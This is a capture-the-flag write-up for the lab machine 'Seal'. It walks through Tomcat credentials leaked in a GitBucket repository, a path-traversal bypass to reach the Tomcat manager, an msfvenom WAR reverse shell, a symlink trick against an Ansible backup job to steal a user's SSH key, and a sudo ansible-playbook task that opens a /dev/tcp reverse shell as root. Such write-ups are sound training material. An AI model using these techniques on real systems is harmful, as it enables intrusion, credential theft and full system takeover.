# Seal

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.190
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 06:12 EDT
Nmap scan report for 10.129.95.190
Host is up (0.0082s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy
```

### Vegetables

Port 443 hosts a market page:

<figure><img src="../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

We can do a `gobuster` scan on the website to find what it is available:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://10.129.95.190/ -k -t 100      
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.95.190/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/03 06:16:19 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> http://10.129.95.190/images/]
/admin                (Status: 302) [Size: 0] [--> http://10.129.95.190/admin/]
/icon                 (Status: 302) [Size: 0] [--> http://10.129.95.190/icon/]
/css                  (Status: 302) [Size: 0] [--> http://10.129.95.190/css/]
/js                   (Status: 302) [Size: 0] [--> http://10.129.95.190/js/]
/manager              (Status: 302) [Size: 0] [--> http://10.129.95.190/manager/]
```

There's a `/manager` and `/admin` directory. The former returns 403, while the latter returns an error from Tomcat:

<figure><img src="../../../.gitbook/assets/image (183) (3).png" alt=""><figcaption></figcaption></figure>

Interesting. Let's take a look at port 8080.

### GitBucket --> Tomcat Creds

Port 8080 is hosting a GitBucket instance:

<figure><img src="../../../.gitbook/assets/image (120) (3).png" alt=""><figcaption></figcaption></figure>

We can create a new account and sign in to see if there are any existing repositories. Straight away, we see tons of push requests to the Market repository.

<figure><img src="../../../.gitbook/assets/image (122) (4) (1).png" alt=""><figcaption></figcaption></figure>

From this, we can find the changes made to the repository. From one of them, we can view the password for the administrator panel by viewing changes made to `tomcat-users.xml`.&#x20;

<figure><img src="../../../.gitbook/assets/image (185) (3).png" alt=""><figcaption></figcaption></figure>

However, we still cannot access the portal.&#x20;

### Directory Traversal --> RCE

While reading Hakctricks for Tomcat vulnerabilities, I found this:

{% embed url="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/" %}

So by using `/;/`, we might be able to bypass the 403 given earlier. This works for this machine.

<figure><img src="../../../.gitbook/assets/image (102) (2).png" alt=""><figcaption></figcaption></figure>

Using `tomcat:42MrHBf*z8{Z%`, we can access the Tomcat dashboard:

<figure><img src="../../../.gitbook/assets/image (154) (5).png" alt=""><figcaption></figcaption></figure>

Now we just need to generate a reverse shell with a `msfvenom`.&#x20;

```
$ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f war -o pwn.war      
Payload size: 13319 bytes
Final size of war file: 13319 bytes
Saved as: pwn.war
```

Then, we just need to upload this and run it. However, I did get blocked the first time when trying to upload. Reading more into the exploit, we can apparently append `/.;/` anywhere within the URL to bypass the check. After some trial and error, this URL worked:

{% code overflow="wrap" %}
```
https://10.129.95.190/manager/.;/html/upload?org.apache.catalina.filters.CSRF_NONCE=5F28315713273679760DD841AB5F1B53
```
{% endcode %}

Then, we can run our file and get a shell:

<figure><img src="../../../.gitbook/assets/image (156) (4).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### To Luis

We couldn't access the user flag as `tomcat`. While looking around, I found some interesting files in `/opt`.&#x20;

```
tomcat@seal:/opt$ ls
backups
tomcat@seal:/opt$ cd backups/
tomcat@seal:/opt/backups$ ls
archives  playbook
```

Within the `/playbook` directory, there was a YAML playbook script for Ansible that seems to be running every minute or so:

```
tomcat@seal:/opt/backups/playbook$ ls
run.yml
tomcat@seal:/opt/backups/playbook$ cat run.yml 
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files
```

This takes is used for backing the web directory up, and for some reason the `copy_links` variable has been set to True, indicating that this playbook follows symlinks. As such, the exploit is to basically create a symlink between the user's home directory and one of the files being backed up.&#x20;

Afterwards, we can take the newest backup and open it to find the user's home directory has also been backed up.&#x20;

```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
total 100
drwxr-xr-x 7 root root  4096 May  7  2021 .
drwxr-xr-x 3 root root  4096 May  6  2021 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6  2021 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7  2021 uploads
$ ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
```

The `uploads` file is used because we have write access to it. Afterwards, we just need to open the backup made and head to the `uploads` file.&#x20;

```
tomcat@seal:/dev/shm$ tar zxf backup-2023-05-03-10\:42\:32.gz --force-local
tomcat@seal:/dev/shm$ ls
backup-2023-05-03-10:42:32.gz  dashboard  spare.gz
tomcat@seal:/dev/shm/dashboard/uploads$ ls -la
total 0
drwxr-x--- 3 tomcat tomcat  60 May  3 10:46 .
drwxr-x--- 7 tomcat tomcat 160 May  7  2021 ..
drwxr-x--- 9 tomcat tomcat 280 May  7  2021 luis
```

We can grab the user flag and also his SSH private key!

### To Root

Now that we are `luis`, we can check our `sudo` privileges:

```
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

So we can create our own playbook for a `root` reverse shell basically. I made one like this:

```
- hosts: localhost
  tasks:
  - name: shell
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1'
```

Then, we can run the playbook and get a reverse shell as `root`.

```
$ nc -lvnp 4444
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.95.190] 49578
root@seal:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted!
